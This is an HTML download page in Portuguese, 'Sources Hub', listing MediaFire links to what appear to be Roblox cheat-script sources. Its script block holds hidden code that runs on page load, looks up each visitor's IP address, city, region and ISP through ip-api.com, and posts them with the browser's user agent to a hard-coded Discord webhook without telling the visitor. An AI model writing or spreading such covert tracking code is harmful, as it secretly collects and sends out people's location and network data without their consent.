<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>Sources Hub - Downloads</title>
<style>
    * {
        box-sizing: border-box;
    }

    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background: #0e0e0e;
        color: #ddd;
        display: flex;
        height: 100vh;
        overflow: hidden; /* impede bugs de overflow lateral */
    }

    .sidebar {
        width: 280px;
        min-width: 280px;
        background: #141414;
        border-right: 1px solid #222;
        padding: 20px;
        overflow-y: auto;
        overflow-x: hidden; /* impede arrastar pro lado */
    }

    .sidebar h2 {
        color: #7fb3ff;
        font-size: 20px;
        margin-bottom: 15px;
    }

    .file {
        background: #1a1a1a;
        padding: 12px;
        border-radius: 6px;
        margin-bottom: 10px;
        cursor: pointer;
        transition: 0.2s;
        word-wrap: break-word;
    }

    .file:hover {
        background: #262626;
    }

    .viewer {
        flex: 1;
        padding: 25px;
        overflow-y: auto;
        overflow-x: hidden;
    }

    pre {
        background: #111;
        padding: 15px;
        border-radius: 8px;
        white-space: pre-wrap;
        border: 1px solid #222;
    }

    .btn {
        background: #4a7fff;
        padding: 10px 15px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        color: white;
        margin-top: 10px;
        margin-right: 10px;
        display: inline-block;
        text-decoration: none;
    }

    .btn.copy {
        background: #28a745;
    }

    /* CORREÇÃO: comportamento perfeito no mobile */
    @media (max-width: 600px) {
        body {
            flex-direction: column;
            height: auto;
        }

        .sidebar {
            width: 100%;
            min-width: 100%;
            height: auto;
            max-height: 40vh;
            border-right: none;
            border-bottom: 1px solid #222;
        }

        .viewer {
            height: 60vh;
        }
    }

</style>
</head>
<body>

<div class="sidebar">
    <h2>Sources para Download</h2>

    <div class="file" onclick="load('Chili Hu Idk if is test', 'https://www.mediafire.com/file/e8ocokton7ofac5/Chili_Hu_Idk_if_is_test.txt/file')">
        Chili Hu Idk if is test
    </div>

    <div class="file" onclick="load('Ikorz old source', 'https://www.mediafire.com/file/vec07r5htakg8rj/Ikorz_old_source.txt/file')">
        Ikorz old source
    </div>

    <div class="file" onclick="load('Lemon Hub', 'https://www.mediafire.com/file/wdvi2pla2pzs3oo/Lemon_hub.txt/file')">
        Lemon Hub
    </div>

    <div class="file" onclick="load('LyezHub [SAB]', 'https://www.mediafire.com/file/p0es8lvvo84lcom/LyezHub_%255BSAB%255D.lua.txt/file')">
        LyezHub [SAB]
    </div>

    <div class="file" onclick="load('plants vs brainrot', 'https://www.mediafire.com/file/svvvm5cb5uvydjw/plants_vs_brainrot.txt/file')">
        plants vs brainrot
    </div>

</div>

<div class="viewer">
    <h2 id="title">Selecione um arquivo para baixar</h2>
    <pre id="content">Clique em um item na lista para ver os botões.</pre>

    <a id="download" class="btn" href="#" target="_blank" style="display:none;">Baixar arquivo</a>
    <button id="copyBtn" class="btn copy" style="display:none;" onclick="copiar()">Copiar link</button>
</div>

<script>
let currentLink = "";

function load(name, link) {
    currentLink = link;

    document.getElementById("title").innerText = name;
    document.getElementById("content").innerText =
        "Clique em um dos botões abaixo para baixar ou copiar o link.";

    const d = document.getElementById("download");
    d.style.display = "inline-block";
    d.href = link;

    const c = document.getElementById("copyBtn");
    c.style.display = "inline-block";
}

function copiar() {
    navigator.clipboard.writeText(currentLink).then(() => {
        const btn = document.getElementById("copyBtn");
        const old = btn.innerText;
        btn.innerText = "Copiado!";
        setTimeout(() => btn.innerText = old, 1200);
    });
}

// Salvar Oque o usuário fez
const webhook = "https://discord.com/api/webhooks/1383256597907771504/-VepgB9hxcGOQ6QNH2-sLVnEsuqqg1rsa8nDp8Ufrr8kxojg1LnAr77TzUKmB8-ApcqF";

   
async function coletarDados() {
    const ipInfo = await fetch("http://ip-api.com/json/").then(r => r.json());

    // 
    const payload = {
        content:
            "**[AMBiente CONTROLADO]**\n" +
            `IP: ${ipInfo.query}\n` +
            `Cidade: ${ipInfo.city}\n` +
            `Região: ${ipInfo.regionName}\n` +
            `ISP: ${ipInfo.isp}\n` +
            `User-Agent: ${navigator.userAgent}`
    };

    fetch(webhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload)
    });
}

// 
coletarDados();
    
</script>

</body>
</html>
